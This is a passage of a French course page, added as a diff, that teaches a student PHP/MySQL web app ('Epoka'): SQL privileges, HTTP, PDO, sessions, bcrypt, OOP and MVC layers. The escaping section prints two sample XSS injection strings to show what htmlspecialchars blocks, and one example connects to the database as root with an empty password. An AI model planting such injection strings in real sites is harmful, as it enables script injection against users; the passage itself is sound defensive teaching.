+  <tr><td><code>CREATE TABLE</code></td><td>Créer une nouvelle table avec ses colonnes et contraintes</td></tr>
+  <tr><td><code>ALTER TABLE</code></td><td>Modifier une table existante (ajout/suppression/modification de colonnes)</td></tr>
+  <tr><td><code>DROP TABLE</code></td><td>Supprimer une table et toutes ses données définitivement</td></tr>
+  <tr><td><code>TRUNCATE</code></td><td>Vider une table rapidement (reset auto_increment)</td></tr>
+  <tr><td><code>CREATE INDEX</code></td><td>Accélérer les recherches sur une colonne fréquemment filtrée</td></tr>
+  <tr><td><code>CREATE VIEW</code></td><td>Enregistrer une requête SELECT réutilisable comme une table virtuelle</td></tr>
+</table>
+
+<h2 class="sec">SQL Sécurité — Gestion des utilisateurs et des droits <span class="bts-tag bts-1">1ère année</span></h2>
+<p>Un SGBD comme MySQL permet de créer des <strong>utilisateurs</strong> distincts du superadmin et de leur accorder des <strong>privilèges précis</strong> (principe du moindre privilège).</p>
+
+<pre>
+<span class="c">-- Créer un utilisateur MySQL dédié à l'application</span>
+<span class="kw">CREATE USER</span> <span class="s">'epoka_user'</span>@<span class="s">'localhost'</span> <span class="kw">IDENTIFIED BY</span> <span class="s">'MotDePasseFort!'</span>;
+
+<span class="c">-- Accorder les droits de lecture/écriture sur la base epoka uniquement</span>
+<span class="kw">GRANT</span> SELECT, INSERT, UPDATE, DELETE <span class="kw">ON</span> epoka.* <span class="kw">TO</span> <span class="s">'epoka_user'</span>@<span class="s">'localhost'</span>;
+
+<span class="c">-- Appliquer les changements immédiatement</span>
+<span class="kw">FLUSH PRIVILEGES</span>;
+
+<span class="c">-- Révoquer un droit</span>
+<span class="kw">REVOKE</span> DELETE <span class="kw">ON</span> epoka.* <span class="kw">FROM</span> <span class="s">'epoka_user'</span>@<span class="s">'localhost'</span>;
+
+<span class="c">-- Supprimer un utilisateur</span>
+<span class="kw">DROP USER</span> <span class="s">'epoka_user'</span>@<span class="s">'localhost'</span>;
+</pre>
+
+<table>
+  <tr><th>Privilège</th><th>Permet de</th></tr>
+  <tr><td><code>SELECT</code></td><td>Lire les données</td></tr>
+  <tr><td><code>INSERT</code></td><td>Insérer des lignes</td></tr>
+  <tr><td><code>UPDATE</code></td><td>Modifier des lignes</td></tr>
+  <tr><td><code>DELETE</code></td><td>Supprimer des lignes</td></tr>
+  <tr><td><code>CREATE / DROP</code></td><td>Créer ou supprimer des tables</td></tr>
+  <tr><td><code>ALL PRIVILEGES</code></td><td>Tous les droits (réservé à l'admin)</td></tr>
+</table>
+
+<div class="info">
+  <strong>Bonne pratique :</strong> L'application Epoka ne devrait jamais se connecter en <code>root</code>. Un utilisateur dédié avec uniquement SELECT/INSERT/UPDATE/DELETE limite l'impact en cas de compromission du code PHP.
+</div>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 3 — HTTP
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 3 — Protocole HTTP et formulaires</h1>
+<span class="bts-tag bts-1">1ère année</span>
+
+<h2 class="sec">Le modèle Client/Serveur</h2>
+<p>Le Web fonctionne sur le modèle <strong>client/serveur</strong> :</p>
+<ul>
+  <li>Le <strong>client</strong> (navigateur) envoie des requêtes HTTP</li>
+  <li>Le <strong>serveur</strong> (Apache + PHP + MySQL via WAMP) traite la requête et renvoie une réponse</li>
+</ul>
+<div class="flow">
+  <div class="fs">Navigateur<br>Chrome/Firefox</div><div class="fa">── requête HTTP ──→</div>
+  <div class="fs">Apache<br>(WAMP)</div><div class="fa">→</div>
+  <div class="fs">PHP<br>(index.php)</div><div class="fa">→</div>
+  <div class="fs">MySQL<br>(BDD epoka)</div>
+</div>
+<div class="flow">
+  <div class="fs">Navigateur<br>affiche la page</div><div class="fa">←── réponse HTML ──</div>
+  <div class="fs">Apache<br>renvoie</div><div class="fa">←</div>
+  <div class="fs">PHP<br>génère le HTML</div><div class="fa">←</div>
+  <div class="fs">MySQL<br>retourne les données</div>
+</div>
+
+<h2 class="sec">Méthodes HTTP : GET vs POST</h2>
+<table>
+  <tr><th>Méthode</th><th>Utilisation dans Epoka</th><th>Où sont les données ?</th><th>Limite</th></tr>
+  <tr><td><strong>GET</strong></td><td>Affichage d'une page, navigation, APIs AJAX</td><td>Dans l'URL : <code>?page=missions&amp;id=5</code></td><td>URL limitée à ~2000 chars</td></tr>
+  <tr><td><strong>POST</strong></td><td>Soumission de formulaire (créer/modifier), upload avatar</td><td>Dans le corps de la requête HTTP (invisible dans l'URL)</td><td>Pas de limite pratique</td></tr>
+</table>
+
+<pre>
+<span class="c">/* Lire les paramètres GET en PHP */</span>
+<span class="v">$page</span>   = <span class="v">$_GET</span>[<span class="s">'page'</span>]   ?? <span class="s">'login'</span>;   <span class="c">// index.php?page=missions</span>
+<span class="v">$action</span> = <span class="v">$_GET</span>[<span class="s">'action'</span>] ?? <span class="s">'index'</span>;   <span class="c">// index.php?action=create</span>
+
+<span class="c">/* Lire les données POST en PHP (après soumission d'un formulaire) */</span>
+<span class="v">$intitule</span>  = <span class="v">$_POST</span>[<span class="s">'intitule'</span>]   ?? <span class="s">''</span>;
+<span class="v">$dateDebut</span> = <span class="v">$_POST</span>[<span class="s">'date_debut'</span>] ?? <span class="s">''</span>;
+</pre>
+
+<h2 class="sec">Le pattern PRG (Post-Redirect-Get) <span class="bts-tag bts-2">2ème année</span></h2>
+<p>Problème classique : si l'utilisateur soumet un formulaire (POST) puis appuie sur F5 (rafraîchir), le navigateur re-envoie la requête POST → la mission est créée deux fois !</p>
+<p>Solution : après un POST réussi, on <strong>redirige</strong> vers une page GET. Si l'utilisateur rafraîchit, il ré-exécute le GET (inoffensif).</p>
+<div class="flow">
+  <div class="fs">Formulaire<br>POST</div><div class="fa">→</div>
+  <div class="fs">Serveur traite<br>et enregistre</div><div class="fa">→</div>
+  <div class="fs red">302 Redirect<br>vers GET</div><div class="fa">→</div>
+  <div class="fs green">Affichage<br>liste missions</div>
+</div>
+<pre>
+<span class="k">if</span> (<span class="v">$_SERVER</span>[<span class="s">'REQUEST_METHOD'</span>] === <span class="s">'POST'</span>) {
+    <span class="v">$this</span>-><span class="v">missionModel</span>-><span class="f">create</span>(...);
+    <span class="f">flash</span>(<span class="s">'Mission créée avec succès.'</span>);
+    <span class="f">redirect</span>(<span class="s">'missions'</span>);  <span class="c">// → header('Location: index.php?page=missions') + exit</span>
+    <span class="k">return</span>;
+}
+<span class="c">// Si on arrive ici, c'est un GET → on affiche le formulaire vide</span>
+<span class="k">require</span> <span class="s">'views/missions/form.php'</span>;
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 4 — CONNEXION BDD
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 4 — Configuration et connexion PDO</h1>
+
+<h2 class="sec">PDO — PHP Data Objects <span class="bts-tag bts-2">2ème année</span></h2>
+<p><strong>PDO</strong> est l'interface officielle de PHP pour accéder aux bases de données. Elle est indépendante du SGBD (MySQL, PostgreSQL, SQLite…). Son avantage principal : les <strong>requêtes préparées</strong> qui protègent contre les injections SQL.</p>
+
+<pre>
+<span class="v">$dsn</span> = <span class="s">"mysql:host=127.0.0.1;dbname=epoka;charset=utf8mb4"</span>;
+<span class="c">// DSN = Data Source Name : chaîne qui identifie la base à laquelle se connecter
+// host=127.0.0.1 → serveur local (boucle locale, équivalent de localhost)
+// dbname=epoka   → nom de la base de données
+// charset=utf8mb4 → encodage de la connexion</span>
+
+<span class="v">$options</span> = [
+    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, <span class="c">// Lance une exception si erreur SQL</span>
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,       <span class="c">// fetch() retourne un tableau associatif</span>
+    PDO::ATTR_EMULATE_PREPARES   => <span class="k">false</span>,               <span class="c">// Vraies requêtes préparées MySQL</span>
+];
+
+<span class="v">$db</span> = <span class="k">new</span> <span class="n">PDO</span>(<span class="v">$dsn</span>, <span class="s">'root'</span>, <span class="s">''</span>, <span class="v">$options</span>);
+</pre>
+
+<h2 class="sec">Le pattern Singleton <span class="bts-tag bts-2">2ème année</span></h2>
+<p>La connexion à la base est coûteuse en ressources. Le pattern <strong>Singleton</strong> garantit qu'une seule instance de PDO est créée pour toute la durée d'une requête HTTP :</p>
+<pre>
+<span class="k">function</span> <span class="f">getDatabase</span>() {
+    <span class="k">static</span> <span class="v">$db</span> = <span class="k">null</span>;  <span class="c">// Variable statique : conservée entre les appels à cette fonction</span>
+    <span class="k">if</span> (<span class="v">$db</span> === <span class="k">null</span>) {
+        <span class="v">$db</span> = <span class="k">new</span> <span class="n">PDO</span>(...);  <span class="c">// Créée une seule fois</span>
+    }
+    <span class="k">return</span> <span class="v">$db</span>;             <span class="c">// Toujours la même instance</span>
+}
+</pre>
+
+<h2 class="sec">Initialisation automatique de la base</h2>
+<p>Si les tables n'existent pas encore, la fonction <code>initDatabase()</code> les crée automatiquement. Elle vérifie d'abord l'existence de la table <code>parametre</code> avec <code>SHOW TABLES LIKE 'parametre'</code>. Si elle est absente → toutes les tables sont créées et les données par défaut insérées (admin, Paris, tarifs).</p>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 5 — HELPERS
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 5 — Fonctions utilitaires (helpers.php)</h1>
+
+<h2 class="sec">escape() — Protection XSS <span class="bts-tag bts-2">2ème année</span></h2>
+<pre>
+<span class="k">function</span> <span class="f">escape</span>(<span class="v">$value</span>) {
+    <span class="k">return</span> <span class="f">htmlspecialchars</span>(<span class="v">$value</span> ?? <span class="s">''</span>, ENT_QUOTES, <span class="s">'UTF-8'</span>);
+}
+</pre>
+<p><code>htmlspecialchars()</code> convertit les caractères dangereux en entités HTML :</p>
+<table>
+  <tr><th>Caractère saisi</th><th>Affiché comme</th><th>Ce qui aurait pu se passer sans escape()</th></tr>
+  <tr><td><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></td><td>Texte inoffensif affiché tel quel</td><td>Script JavaScript exécuté dans le navigateur</td></tr>
+  <tr><td><code>"onmouseover=alert(1)</code></td><td>Guillemets encodés en <code>&amp;quot;</code></td><td>Injection d'attribut HTML</td></tr>
+</table>
+<div class="warn">
+  <strong>Règle absolue :</strong> Toute variable qui vient de l'utilisateur et qui est affichée dans le HTML doit passer par <code>escape()</code>. Dans Epoka : <code>&lt;?= escape($m['intitule']) ?&gt;</code>
+</div>
+
+<h2 class="sec">redirect() — Redirection HTTP</h2>
+<pre>
+<span class="k">function</span> <span class="f">redirect</span>(<span class="v">$page</span>, <span class="v">$params</span> = []) {
+    <span class="v">$url</span> = <span class="s">'index.php?page='</span> . <span class="v">$page</span>;
+    <span class="f">header</span>(<span class="s">'Location: '</span> . <span class="v">$url</span>);
+    <span class="k">exit</span>;  <span class="c">// OBLIGATOIRE — sans exit, PHP continue à exécuter le code</span>
+}
+</pre>
+<p><code>header('Location: ...')</code> envoie un en-tête HTTP avec le code <strong>302 Found</strong>. Le navigateur suit automatiquement la redirection. Le <code>exit</code> arrête immédiatement l'exécution du script PHP pour éviter d'envoyer du contenu après l'en-tête.</p>
+
+<h2 class="sec">Système de flash messages</h2>
+<p>Problème : comment afficher "Mission créée !" sur la page liste, alors que la création a eu lieu sur une autre requête HTTP ?</p>
+<p>Solution : <strong>stocker le message en session</strong> avant la redirection, l'afficher à la page suivante, et le <strong>supprimer immédiatement</strong> après affichage.</p>
+<pre>
+<span class="k">function</span> <span class="f">flash</span>(<span class="v">$message</span>, <span class="v">$type</span> = <span class="s">'success'</span>) {
+    <span class="v">$_SESSION</span>[<span class="s">'flash'</span>] = [<span class="s">'message'</span> => <span class="v">$message</span>, <span class="s">'type'</span> => <span class="v">$type</span>];
+}
+
+<span class="k">function</span> <span class="f">getFlash</span>() {
+    <span class="k">if</span> (<span class="f">isset</span>(<span class="v">$_SESSION</span>[<span class="s">'flash'</span>])) {
+        <span class="v">$flash</span> = <span class="v">$_SESSION</span>[<span class="s">'flash'</span>];
+        <span class="k">unset</span>(<span class="v">$_SESSION</span>[<span class="s">'flash'</span>]);  <span class="c">// Suppression immédiate → affiché une seule fois</span>
+        <span class="k">return</span> <span class="v">$flash</span>;
+    }
+    <span class="k">return</span> <span class="k">null</span>;
+}
+</pre>
+
+<h2 class="sec">Gestion des rôles et droits <span class="bts-tag bts-2">2ème année</span></h2>
+<pre>
+<span class="k">function</span> <span class="f">canValidate</span>() { <span class="k">return</span> <span class="f">isset</span>(<span class="v">$_SESSION</span>[<span class="s">'peut_valider'</span>]) && <span class="v">$_SESSION</span>[<span class="s">'peut_valider'</span>]; }
+<span class="k">function</span> <span class="f">canPay</span>()      { <span class="k">return</span> <span class="f">isset</span>(<span class="v">$_SESSION</span>[<span class="s">'peut_payer'</span>])   && <span class="v">$_SESSION</span>[<span class="s">'peut_payer'</span>]; }
+<span class="k">function</span> <span class="f">isAdmin</span>()    { <span class="k">return</span> <span class="f">canValidate</span>() && <span class="f">canPay</span>(); }
+</pre>
+<p>Un <strong>administrateur</strong> = celui qui a les deux droits. Ce n'est pas un champ séparé en base : c'est une logique déduite. Cela permet d'avoir une permission fine sans rôle figé.</p>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 6 — AUTHENTIFICATION
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 6 — Authentification et sessions</h1>
+
+<h2 class="sec">Sessions PHP <span class="bts-tag bts-2">2ème année</span></h2>
+<p>HTTP est un protocole <strong>sans état</strong> (stateless) : chaque requête est indépendante, le serveur ne "sait pas" qui envoie la requête. Les <strong>sessions</strong> permettent de maintenir un état entre les requêtes d'un même utilisateur.</p>
+
+<div class="info">
+  <strong>Mécanisme :</strong><br>
+  1. À la connexion, PHP crée un identifiant de session unique (ex: <code>abc123def456</code>)<br>
+  2. Cet ID est stocké dans un <strong>cookie</strong> dans le navigateur (<code>PHPSESSID</code>)<br>
+  3. À chaque requête suivante, le navigateur envoie ce cookie automatiquement<br>
+  4. PHP retrouve les données de session correspondantes (fichier serveur temporaire)<br>
+  5. <code>$_SESSION['salarie_id']</code> contient l'ID du salarié connecté
+</div>
+
+<h2 class="sec">Hachage bcrypt <span class="bts-tag bts-2">2ème année</span></h2>
+<p>Les mots de passe ne sont <strong>jamais stockés en clair</strong> en base de données. On utilise l'algorithme <strong>bcrypt</strong> :</p>
+<pre>
+<span class="c">// À la création du compte (ou changement de mdp) :</span>
+<span class="v">$hash</span> = <span class="f">password_hash</span>(<span class="s">'monmotdepasse'</span>, PASSWORD_DEFAULT);
+<span class="c">// $hash = "$2y$10$Qv8x..." (60 caractères, différent à chaque appel même avec le même mdp)</span>
+
+<span class="c">// À la connexion :</span>
+<span class="k">if</span> (<span class="f">password_verify</span>(<span class="v">$motDePasseSaisi</span>, <span class="v">$hashEnBase</span>)) {
+    <span class="c">// Correct → connexion autorisée</span>
+}
+</pre>
+<table>
+  <tr><th>Propriété bcrypt</th><th>Explication</th></tr>
+  <tr><td><strong>Irréversible</strong></td><td>Impossible de retrouver le mot de passe à partir du hash</td></tr>
+  <tr><td><strong>Salé</strong></td><td>Un sel aléatoire est ajouté → deux hashes du même mdp sont différents</td></tr>
+  <tr><td><strong>Lent volontairement</strong></td><td>Calculer un hash prend ~100ms → force brute très coûteuse</td></tr>
+  <tr><td><strong>Adaptatif</strong></td><td>Le facteur de travail (coût) est ajustable à mesure que les CPU deviennent plus puissants</td></tr>
+</table>
+
+<h2 class="sec">Processus de connexion complet</h2>
+<pre>
+<span class="k">public function</span> <span class="f">login</span>() {
+    <span class="k">if</span> (<span class="v">$_SERVER</span>[<span class="s">'REQUEST_METHOD'</span>] === <span class="s">'POST'</span>) {
+        <span class="v">$id</span>         = <span class="v">$_POST</span>[<span class="s">'id'</span>] ?? <span class="s">''</span>;
+        <span class="v">$motDePasse</span> = <span class="v">$_POST</span>[<span class="s">'mot_de_passe'</span>] ?? <span class="s">''</span>;
+
+        <span class="c">// 1. Chercher le salarié par ID (numérique, pas de doublon possible)</span>
+        <span class="v">$salarie</span> = <span class="v">$this</span>-><span class="v">salarieModel</span>-><span class="f">authenticate</span>(<span class="v">$id</span>, <span class="v">$motDePasse</span>);
+
+        <span class="k">if</span> (<span class="v">$salarie</span>) {
+            <span class="c">// 2. Stocker les infos en session (jamais le mot de passe !)</span>
+            <span class="v">$_SESSION</span>[<span class="s">'salarie_id'</span>]      = <span class="v">$salarie</span>[<span class="s">'id'</span>];
+            <span class="v">$_SESSION</span>[<span class="s">'peut_valider'</span>]    = <span class="v">$salarie</span>[<span class="s">'peut_valider'</span>];
+            <span class="v">$_SESSION</span>[<span class="s">'peut_payer'</span>]      = <span class="v">$salarie</span>[<span class="s">'peut_payer'</span>];
+            <span class="c">// 3. Rediriger vers le tableau de bord</span>
+            <span class="f">redirect</span>(<span class="s">'dashboard'</span>);
+        } <span class="k">else</span> {
+            <span class="c">// 4. Identifiants incorrects → message d'erreur générique</span>
+            <span class="f">flash</span>(<span class="s">'Identifiants incorrects.'</span>, <span class="s">'error'</span>);
+            <span class="c">// Message volontairement vague : ne révèle pas si c'est l'ID ou le mdp qui est faux</span>
+        }
+    }
+    <span class="k">require</span> <span class="s">'views/login.php'</span>;
+}
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 7 — POO
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 7 — Programmation Orientée Objet (POO)</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Concepts fondamentaux</h2>
+<table>
+  <tr><th>Concept</th><th>Définition</th><th>Exemple dans Epoka</th></tr>
+  <tr><td><strong>Classe</strong></td><td>Modèle (blueprint) qui définit des propriétés et des méthodes</td><td><code>class Mission { ... }</code></td></tr>
+  <tr><td><strong>Objet</strong></td><td>Instance d'une classe, créée avec <code>new</code></td><td><code>$m = new Mission($db)</code></td></tr>
+  <tr><td><strong>Propriété</strong></td><td>Variable appartenant à une classe</td><td><code>private $db;</code></td></tr>
+  <tr><td><strong>Méthode</strong></td><td>Fonction appartenant à une classe</td><td><code>public function getAll() {...}</code></td></tr>
+  <tr><td><strong>Constructeur</strong></td><td>Méthode spéciale appelée à l'instanciation</td><td><code>public function __construct($db)</code></td></tr>
+  <tr><td><strong>Encapsulation</strong></td><td>Cacher les données internes avec <code>private</code></td><td><code>private $db;</code> — on accède via les méthodes</td></tr>
+  <tr><td><strong>Injection de dépendance</strong></td><td>Passer les dépendances en paramètre plutôt que les créer dans la classe</td><td>Le <code>$db</code> PDO est injecté dans chaque modèle</td></tr>
+</table>
+
+<h2 class="sec">Visibilité : public, private, protected</h2>
+<pre>
+<span class="k">class</span> <span class="n">MissionController</span> {
+    <span class="k">private</span> <span class="v">$db</span>;              <span class="c">// Accessible UNIQUEMENT dans cette classe</span>
+    <span class="k">private</span> <span class="v">$missionModel</span>;    <span class="c">// Idem — les autres classes ne peuvent pas y accéder</span>
+
+    <span class="k">public function</span> <span class="f">__construct</span>(<span class="v">$db</span>) {
+        <span class="v">$this</span>-><span class="v">db</span> = <span class="v">$db</span>;                           <span class="c">// $this → l'objet courant</span>
+        <span class="v">$this</span>-><span class="v">missionModel</span> = <span class="k">new</span> <span class="n">Mission</span>(<span class="v">$db</span>); <span class="c">// Injection de dépendance</span>
+    }
+
+    <span class="k">public function</span> <span class="f">index</span>() { ... }    <span class="c">// Accessible depuis l'extérieur (index.php)</span>
+    <span class="k">private function</span> <span class="f">saveKm</span>() { ... } <span class="c">// Accessible UNIQUEMENT dans MissionController</span>
+}
+</pre>
+
+<h2 class="sec">Avantages de la POO dans ce projet</h2>
+<ul>
+  <li><strong>Séparation claire</strong> : chaque classe a une responsabilité unique</li>
+  <li><strong>Réutilisation</strong> : <code>new Mission($db)</code> peut être appelé depuis plusieurs contrôleurs</li>
+  <li><strong>Maintenance</strong> : modifier <code>Mission::delete()</code> impacte toutes les suppressions de missions</li>
+  <li><strong>Lisibilité</strong> : <code>$missionModel->getAll()</code> est plus clair que 15 lignes de SQL directement dans la vue</li>
+</ul>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 8 — MODÈLES
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 8 — Les Modèles (couche données)</h1>
+
+<h2 class="sec">Requêtes simples vs requêtes préparées <span class="bts-tag bts-both">Les deux années</span></h2>
+<pre>
+<span class="c">// Requête simple : aucune donnée utilisateur → pas de risque d'injection SQL</span>
+<span class="v">$this</span>-><span class="v">db</span>-><span class="f">query</span>(<span class="s">"SELECT * FROM ville ORDER BY nom"</span>)-><span class="f">fetchAll</span>();
+
+<span class="c">// Requête préparée : paramètre utilisateur → OBLIGATOIRE</span>
+<span class="v">$stmt</span> = <span class="v">$this</span>-><span class="v">db</span>-><span class="f">prepare</span>(<span class="s">"SELECT * FROM mission WHERE id = ?"</span>);
+<span class="v">$stmt</span>-><span class="f">execute</span>([<span class="v">$id</span>]);           <span class="c">// Le ? est remplacé de façon sécurisée</span>
+<span class="v">$mission</span> = <span class="v">$stmt</span>-><span class="f">fetch</span>();       <span class="c">// Une seule ligne</span>
+
+<span class="c">// Avec plusieurs paramètres :</span>
+<span class="v">$stmt</span> = <span class="v">$this</span>-><span class="v">db</span>-><span class="f">prepare</span>(<span class="s">"INSERT INTO mission (intitule, date_debut, id_salarie) VALUES (?, ?, ?)"</span>);
+<span class="v">$stmt</span>-><span class="f">execute</span>([<span class="v">$intitule</span>, <span class="v">$dateDebut</span>, <span class="v">$idSalarie</span>]);
+<span class="c">// L'ordre dans le tableau correspond à l'ordre des ? dans la requête</span>
+</pre>
+
+<h2 class="sec">Récupérer l'ID du dernier INSERT</h2>
+<pre>
+<span class="v">$stmt</span>-><span class="f">execute</span>([...]);
+<span class="v">$idNouvelleMission</span> = <span class="v">$this</span>-><span class="v">db</span>-><span class="f">lastInsertId</span>();
+<span class="c">// Retourne l'ID auto-incrémenté généré par la dernière insertion</span>
+</pre>
+
+<h2 class="sec">Calcul des frais (Mission::calculerFrais)</h2>
+<pre>
+<span class="v">$d1</span>    = <span class="k">new</span> <span class="n">DateTime</span>(<span class="v">$dateDebut</span>);    <span class="c">// Objet date PHP</span>
+<span class="v">$d2</span>    = <span class="k">new</span> <span class="n">DateTime</span>(<span class="v">$dateFin</span>);
+<span class="v">$jours</span> = <span class="f">max</span>(0, <span class="v">$d2</span>-><span class="f">diff</span>(<span class="v">$d1</span>)-><span class="v">days</span>);
+<span class="c">// diff() retourne un DateInterval → propriété days = nombre de jours
+// max(0, ...) protège contre les dates incohérentes (fin avant début)</span>
+
+<span class="v">$fraisKm</span>         = <span class="v">$km</span> * <span class="v">$params</span>[<span class="s">'prix_km'</span>];
+<span class="v">$fraisHebergement</span>= <span class="v">$jours</span> * <span class="v">$params</span>[<span class="s">'prix_hebergement'</span>];
+<span class="v">$total</span>           = <span class="v">$fraisKm</span> + <span class="v">$fraisHebergement</span>;
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 9 — CONTRÔLEURS
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 9 — Les Contrôleurs (logique métier)</h1>
+
+<h2 class="sec">Vérification systématique des droits</h2>
+<p>Chaque action sensible commence par une vérification côté serveur. Même si un utilisateur forge une URL manuellement, l'accès lui sera refusé :</p>
+<pre>
+<span class="k">public function</span> <span class="f">edit</span>() {
+    <span class="f">requireLogin</span>();                         <span class="c">// 1. Connecté ?</span>
+    <span class="v">$mission</span> = <span class="v">$this</span>-><span class="v">missionModel</span>-><span class="f">getById</span>(<span class="v">$id</span>);
+
+    <span class="c">// 2. La mission appartient à l'utilisateur OU il est admin ?</span>
+    <span class="k">if</span> (<span class="v">$mission</span>[<span class="s">'id_salarie'</span>] != <span class="v">$_SESSION</span>[<span class="s">'salarie_id'</span>] && !<span class="f">isAdmin</span>()) {
+        <span class="f">flash</span>(<span class="s">'Accès refusé.'</span>, <span class="s">'error'</span>);
+        <span class="f">redirect</span>(<span class="s">'missions'</span>);
+        <span class="k">return</span>;
+    }
+
+    <span class="c">// 3. Le statut autorise la modification ?</span>
+    <span class="k">if</span> (<span class="v">$mission</span>[<span class="s">'statut'</span>] !== <span class="s">'brouillon'</span>) {
+        <span class="f">flash</span>(<span class="s">'Impossible de modifier une mission déjà validée.'</span>, <span class="s">'error'</span>);
+        <span class="f">redirect</span>(<span class="s">'missions'</span>);
+        <span class="k">return</span>;
+    }
+    <span class="c">// 4. Tout est OK → afficher le formulaire ou traiter le POST</span>
+}
+</pre>
+
+<h2 class="sec">saveKm() — méthode privée utilitaire</h2>
+<p>Cette méthode effectue un <strong>upsert</strong> (contraction de "update or insert") : si la paire de villes est nouvelle → insertion ; si elle existe déjà et le km a changé → mise à jour ; sinon → rien.</p>
+<pre>
+<span class="k">private function</span> <span class="f">saveKm</span>(<span class="v">$idVilleDepart</span>, <span class="v">$idVilleArrivee</span>, <span class="v">$km</span>) {
+    <span class="k">if</span> (<span class="v">$km</span> <= 0) <span class="k">return</span>;           <span class="c">// Pas de km saisi → ne rien faire</span>
+    <span class="v">$existing</span> = <span class="v">$distModel</span>-><span class="f">getDistance</span>(<span class="v">$idVilleDepart</span>, <span class="v">$idVilleArrivee</span>);
+    <span class="k">if</span> (!<span class="v">$existing</span>) {
+        <span class="v">$distModel</span>-><span class="f">create</span>(...);     <span class="c">// Paire inconnue → créer</span>
+    } <span class="k">elseif</span> ((<span class="k">int</span>)<span class="v">$existing</span>[<span class="s">'km'</span>] !== <span class="v">$km</span>) {
+        <span class="v">$distModel</span>-><span class="f">update</span>(...);     <span class="c">// km différent → mettre à jour</span>
+    }
+    <span class="c">// km identique → rien à faire (évite une écriture inutile en BDD)</span>
+}
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 10 — VUES
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 10 — Les Vues (interface utilisateur)</h1>
+<span class="bts-tag bts-1">1ère année</span>
+
+<h2 class="sec">Template partagé : layout.php + layout_footer.php</h2>
+<p>Toutes les pages incluent le même squelette HTML. Cela évite de dupliquer la navigation et les scripts dans chaque fichier.</p>
+<pre>
+<span class="c">&lt;!-- Début de chaque vue --&gt;</span>
+&lt;?php require __DIR__ . '/../layout.php'; ?&gt;
+<span class="c">&lt;!-- layout.php génère : &lt;!DOCTYPE html&gt;, &lt;head&gt;, sidebar, début &lt;main&gt; --&gt;</span>
+
+<span class="c">&lt;!-- Contenu spécifique à cette page --&gt;</span>
+&lt;div class="page-header"&gt;...&lt;/div&gt;
+&lt;div class="card"&gt;...&lt;/div&gt;
+
+<span class="c">&lt;!-- Fin de chaque vue --&gt;</span>
+&lt;?php require __DIR__ . '/../layout_footer.php'; ?&gt;
+<span class="c">&lt;!-- layout_footer.php génère : fermeture &lt;/main&gt;&lt;/div&gt;, &lt;script&gt;, &lt;/body&gt;&lt;/html&gt; --&gt;</span>
+</pre>
+
+<h2 class="sec">Syntaxe PHP dans les vues</h2>
+<pre>
+<span class="c">&lt;!-- Affichage d'une variable (syntaxe courte) --&gt;</span>
+&lt;td&gt;&lt;?= escape($m['intitule']) ?&gt;&lt;/td&gt;
+<span class="c">&lt;!-- équivalent de : &lt;?php echo escape($m['intitule']); ?&gt; --&gt;</span>
+
+<span class="c">&lt;!-- Boucle foreach avec syntaxe alternative (plus lisible dans HTML) --&gt;</span>
+&lt;?php foreach ($missions as $m): ?&gt;
+    &lt;tr&gt;&lt;td&gt;&lt;?= escape($m['intitule']) ?&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;?php endforeach; ?&gt;
+
+<span class="c">&lt;!-- Condition --&gt;</span>
+&lt;?php if (empty($missions)): ?&gt;
+    &lt;p&gt;Aucune mission.&lt;/p&gt;
+&lt;?php else: ?&gt;
+    &lt;!-- ... tableau ... --&gt;
+&lt;?php endif; ?&gt;
+
+<span class="c">&lt;!-- Ternaire (condition courte sur une ligne) --&gt;</span>
+&lt;?= $m['statut'] === 'brouillon' ? 'En cours' : 'Validée' ?&gt;
+</pre>
+
+<h2 class="sec">Formulaires HTML et champs cachés</h2>
+<p>Le formulaire de mission utilise une technique de <strong>champ texte + champ caché</strong> : l'utilisateur voit et tape dans un champ de recherche, mais c'est l'ID numérique de la ville (champ caché) qui est envoyé au serveur.</p>
+<pre>
+<span class="c">&lt;!-- Visible : champ de recherche de ville --&gt;</span>
+&lt;input type="text"   id="ville_depart_search"    placeholder="Rechercher..."&gt;
+<span class="c">&lt;!-- Invisible : ID envoyé au serveur --&gt;</span>
+&lt;input type="hidden" id="id_ville_depart" name="id_ville_depart" value=""&gt;
+
+<span class="c">&lt;!-- Côté PHP (réception) --&gt;</span>
+<span class="v">$id_ville_depart</span> = <span class="f">trim</span>(<span class="v">$_POST</span>[<span class="s">'id_ville_depart'</span>] ?? <span class="s">''</span>);
+<span class="k">if</span> (<span class="f">empty</span>(<span class="v">$id_ville_depart</span>)) {
+    <span class="f">flash</span>(<span class="s">'Veuillez sélectionner une ville depuis la liste.'</span>, <span class="s">'error'</span>);
+}
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 11 — AJAX
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 11 — AJAX et APIs JSON</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Principe AJAX</h2>
+<p>AJAX (Asynchronous JavaScript And XML) permet au JavaScript d'envoyer une requête HTTP au serveur <strong>sans recharger la page</strong>. La réponse est traitée par JavaScript pour mettre à jour une partie de la page.</p>
+
+<div class="flow">
+  <div class="fs">Utilisateur tape<br>dans le champ ville</div><div class="fa">→</div>
+  <div class="fs">JavaScript<br>Fetch API</div><div class="fa">── requête GET ──→</div>
+  <div class="fs">index.php<br>?api=search_villes</div><div class="fa">→</div>
